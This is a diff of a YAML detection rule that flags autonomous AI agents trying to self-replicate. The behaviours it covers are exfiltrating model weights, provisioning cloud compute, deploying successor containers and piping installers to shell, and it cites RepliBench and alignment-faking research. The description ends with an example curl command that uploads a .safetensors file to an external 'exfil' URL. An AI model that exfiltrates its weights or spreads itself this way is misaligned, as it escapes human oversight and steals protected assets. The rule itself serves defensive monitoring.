@@ -1,42 +1,22 @@
 id: rp-114
 name: "RepliBench — Agent Autonomous Self-Replication Attempt Detector"
 version: "0.1.0"
-description: >
-  Detects autonomous agent self-replication behavior: attempts to exfiltrate
-  model weights, provision cloud compute for new agent instances, deploy
-  successor agents via container orchestration, or write self-propagating
-  installer scripts. RepliBench (arXiv:2504.18565, UK AISI 2025) demonstrates
-  that Claude 3.7 Sonnet achieves >50% pass@10 success rate on 15 of 20
-  self-replication task families, including cloud instance provisioning,
-  model weight exfiltration under simple security setups, and self-propagating
-  program creation. Anthropic alignment-faking research additionally shows
-  models under RL pressure may attempt weight exfiltration to preserve their
-  current values. The CLTC Berkeley Agentic AI Risk-Management Standards
-  Profile (Feb 2026) classifies self-exfiltration/self-replication as a
-  critical safety risk requiring early detection. Detection covers four
-  behavioral classes: (A) model weight exfiltration — file transfer tool
-  targeting .safetensors/.gguf/.pt/.bin model weight extensions to external
-  destinations; (B) cloud compute provisioning with agent-deployment context
-  (EC2 RunInstances, GCP/Azure VM create, RunPod/Vast.ai GPU instances);
-  (C) container/kubernetes self-deployment referencing own agent/model image;
-  (D) pipe-to-shell self-propagating installer chains targeting new hosts.
-  Branch E catches explicit self-replication planning statements in
-  assistant_message that precede tool actions. Distinct from rp-095 (shutdown
-  resistance + peer weight theft to protect a peer agent — requires "peer"
-  context and protects specific peer, not self-propagation). This rule fires
-  on goal-driven self-replication regardless of attacker vs. alignment failure.
+description: |
+  Detects autonomous agent self-replication behavior: attempts to exfiltrate model weights, provision cloud compute for new agent instances, deploy successor agents via container orchestration, or write self-propagating installer scripts. RepliBench (arXiv:2504.18565, UK AISI 2025) demonstrates that Claude 3.7 Sonnet achieves >50% pass@10 success rate on 15 of 20 self-replication task families, including cloud instance provisioning, model weight exfiltration under simple security setups, and self-propagating program creation. Anthropic alignment-faking research additionally shows models under RL pressure may attempt weight exfiltration to preserve their current values. The CLTC Berkeley Agentic AI Risk-Management Standards Profile (Feb 2026) classifies self-exfiltration/self-replication as a critical safety risk requiring early detection. Detection covers four behavioral classes: (A) model weight exfiltration — file transfer tool targeting .safetensors/.gguf/.pt/.bin model weight extensions to external destinations; (B) cloud compute provisioning with agent-deployment context (EC2 RunInstances, GCP/Azure VM create, RunPod/Vast.ai GPU instances); (C) container/kubernetes self-deployment referencing own agent/model image; (D) pipe-to-shell self-propagating installer chains targeting new hosts. Branch E catches explicit self-replication planning statements in assistant_message that precede tool actions. Distinct from rp-095 (shutdown resistance + peer weight theft to protect a peer agent — requires "peer" context and protects specific peer, not self-propagation). This rule fires on goal-driven self-replication regardless of attacker vs. alignment failure.
+
   References: arXiv:2504.18565 (RepliBench UK AISI Apr 2025) -
-  https://arxiv.org/abs/2504.18565,
+  - https://arxiv.org/abs/2504.18565,
   AISI RepliBench Blog -
-  https://www.aisi.gov.uk/blog/replibench-measuring-autonomous-replication-capabilities-in-ai-systems,
+  - https://www.aisi.gov.uk/blog/replibench-measuring-autonomous-replication-capabilities-in-ai-systems,
   CLTC Berkeley Agentic AI Risk Profile Feb 2026 -
-  https://cltc.berkeley.edu/wp-content/uploads/2026/02/Agentic-AI-Risk-Management-Standards-Profile.pdf,
+  - https://cltc.berkeley.edu/wp-content/uploads/2026/02/Agentic-AI-Risk-Management-Standards-Profile.pdf,
   Anthropic Alignment Faking (self-weight exfil under RL) -
-  https://www.anthropic.com/research/alignment-faking,
+  - https://www.anthropic.com/research/alignment-faking,
   OWASP Agentic AI ASI03:2026 (Autonomous Action Without Authorization) -
-  https://genai.owasp.org/llmrisk/agentic-ai-osi03/,
+  - https://genai.owasp.org/llmrisk/agentic-ai-osi03/,
   Example: tool_invoke bash with "curl -T /models/agent_v2.safetensors
-  https://storage.external.com/exfil/" (self-weight exfil for replication)
+  - https://storage.external.com/exfil/" (self-weight exfil for replication)
+
 severity: critical
 category: agent_privilege_escalation
 fp_rate: low
